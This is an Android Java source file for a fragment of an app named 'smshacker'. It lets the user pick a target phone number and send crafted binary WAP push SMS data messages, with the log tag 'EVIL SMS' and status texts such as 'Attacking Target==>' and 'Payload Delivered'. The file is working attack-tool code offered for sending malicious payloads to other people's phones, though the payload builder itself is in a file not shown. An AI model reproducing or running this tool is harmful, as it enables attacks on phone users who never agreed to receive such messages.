package pk.development.pro.smshacker.frags;

import android.Manifest;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import pk.development.pro.smshacker.R;
import pk.development.pro.smshacker.SmsUtils;

import static android.app.Activity.RESULT_OK;

public class HackerFrag extends Fragment {
    private static String[] PERMISSIONS = {
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE
    };

    private Button btnWapPushSendExp2;
    private EditText editTextWapPushNumberExp2, editMsgExp2;
    private TextView tvWapPushResultExp2;
    private ScrollView scrollViewWapPushExp2;
    private Spinner spinnerWapPushExp2, spinnerWapPortExp2,spinnerWapIDExp2;
    private Button imgBtnContactExp2;
    private RadioButton radioHexString, radioStr2Hex;

    private static final String TAG = "EVIL SMS";
    private BroadcastReceiver delReportReceiver;
    private PendingIntent attackingIntent;
    private PendingIntent infectedIntent;
    private static final int REQUEST_CONTACT_PICKER = 1000;

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View root = inflater.inflate(R.layout.fragment_hacker, container, false);

        editTextWapPushNumberExp2  = root.findViewById(R.id.editTextWapPushNumberExp2);
        editMsgExp2 = root.findViewById(R.id.editMsgExp2);

        tvWapPushResultExp2 = root.findViewById(R.id.tvResultWapPushExp2);
        scrollViewWapPushExp2 = root.findViewById(R.id.scrollViewWapPushExp2);
        spinnerWapPushExp2 = root.findViewById(R.id.spinnerWapPushExp2);
        spinnerWapPortExp2 = root.findViewById(R.id.spinnerWapPortExp2);
        spinnerWapIDExp2 = root.findViewById(R.id.spinnerWapIDExp2);
        btnWapPushSendExp2 = root.findViewById(R.id.btnSendWapPushExp2);
        imgBtnContactExp2 = root.findViewById(R.id.imgBtnContactExp2);

        radioHexString = root.findViewById(R.id.radioHexString);
        radioStr2Hex = root.findViewById(R.id.radioStr2Hex);

        spinnerWapPushExp2.setAdapter(new ArrayAdapter<>(getActivity(),
                android.R.layout.simple_spinner_item, Arrays.asList(SmsUtils.ContentTypes)));

        spinnerWapPushExp2.setSelection(3);

        List<String> ids = new ArrayList<>();

        for(int i = 0; i < 254; i++) {

            ids.add((i < 16) ? "0" + Integer.toHexString(i):Integer.toHexString(i));
        }

        spinnerWapIDExp2.setAdapter((new ArrayAdapter<>(getActivity(),
                android.R.layout.simple_spinner_item, ids)));

        spinnerWapIDExp2.setSelection(220);//dc

        imgBtnContactExp2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectContact();
            }
        });

        btnWapPushSendExp2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                byte[] pdu = SmsUtils.createCustomMessage(editMsgExp2.getText().toString().replace("-","").replace("\\s+",""));

                if(editTextWapPushNumberExp2.getText().toString().length() == 0) {
                    Toast.makeText(getActivity(), "Please enter a number", Toast.LENGTH_SHORT).show();

                } else {
                    Snackbar.make(v, "Building Payload....", Snackbar.LENGTH_LONG)
                            .setAction("Action", null).show();

                   SmsManager.getDefault().sendDataMessage(
                            editTextWapPushNumberExp2.getText().toString(),
                            null,
                            SmsUtils.WAP_PORTS.get(spinnerWapPortExp2.getSelectedItemPosition()),
                            pdu,
                            attackingIntent,
                            infectedIntent);

                }
            } });

        attackingIntent = PendingIntent.getBroadcast(getActivity(),
                0x5555, new Intent("evilsms.attacking"),
                PendingIntent.FLAG_CANCEL_CURRENT);

        infectedIntent = PendingIntent.getBroadcast(getActivity(), 0x5555, new Intent("evilsms.infected"),
                PendingIntent.FLAG_CANCEL_CURRENT);

        ActivityCompat.requestPermissions(getActivity(), PERMISSIONS, 0x1001 );
        delReportReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                if ("evilsms.attacking".equalsIgnoreCase(intent.getAction())) {
                    Snackbar.make(HackerFrag.this.getView(), "Attacking Target==>", Snackbar.LENGTH_LONG)
                            .setAction("Action", null).show();
                    Toast.makeText(getActivity(), "Attacking Target==>", Toast.LENGTH_SHORT).show();
                } else if ("evilsms.infected".equalsIgnoreCase(intent.getAction())) {
                    if (intent.hasExtra("pdu")) {
                        byte[] pdu = (byte[]) intent.getExtras().get("pdu");
                        if (pdu != null && pdu.length > 1) {
                            String msg =  (pdu[pdu.length-1] == 0x00)
                                    ? "Payload Delivered: User Online"
                                    : "Payload Failed: User Offline";

                            Snackbar.make(HackerFrag.this.getView(),msg, Toast.LENGTH_LONG ).show();
                            Toast.makeText(getActivity(), msg, Toast.LENGTH_SHORT).show();
                        }
                    }

                }

            }
        };
        return root;
    }

    static final int REQUEST_SELECT_PHONE_NUMBER = 1;

    public void selectContact() {
        // Start an activity for the user to pick a phone number from contacts
        Intent intent = new Intent(Intent.ACTION_PICK);
        intent.setType(ContactsContract.CommonDataKinds.Phone.CONTENT_TYPE);
        if (intent.resolveActivity(getActivity().getPackageManager()) != null) {
            startActivityForResult(intent, REQUEST_SELECT_PHONE_NUMBER);
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_SELECT_PHONE_NUMBER && resultCode == RESULT_OK) {
            // Get the URI and query the content provider for the phone number
            Uri contactUri = data.getData();
            String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
            Cursor cursor = getActivity().getContentResolver().query(contactUri, projection,
                    null, null, null);
            // If the cursor returned is valid, get the phone number
            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                editTextWapPushNumberExp2.setText(cursor.getString(numberIndex));
            }
        }
    }


    @Override
    public void onResume() {
        super.onResume();
        startReceiver();
    }
    private void startReceiver() {

        try {
            if(delReportReceiver != null) getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(HackerFrag.TAG, "Failed to stop receiver");
        }


        IntentFilter filter = new IntentFilter();
        filter.addAction("evilsms.attacking");
        filter.addAction("evilsms.infected");
        filter.addAction("android.provider.Telephony.WAP_PUSH_DELIVER");
        getActivity().registerReceiver(delReportReceiver, filter);
    }
    @Override
    public void onPause() {
        super.onPause();
        try {
            getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(HackerFrag.TAG, "Failed to stop receiver");
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            getActivity().unregisterReceiver(delReportReceiver);
        } catch (Exception ex) {
            Log.e(HackerFrag.TAG, "Failed to stop receiver");
        }
    }


    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 0x1001: {
                if (!(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    Toast.makeText(getActivity(), "Please set all permissions", Toast.LENGTH_LONG).show();
                    try {
                        Intent intent = new Intent();
                        intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        Uri uri = Uri.fromParts("package", getActivity().getPackageName(), null);
                        intent.setData(uri);
                        startActivity(intent);
                    } catch(Exception ex) {
                        Log.e(TAG, "Error opening settings  intent");

                    }

                }
            }
        }
    }

}
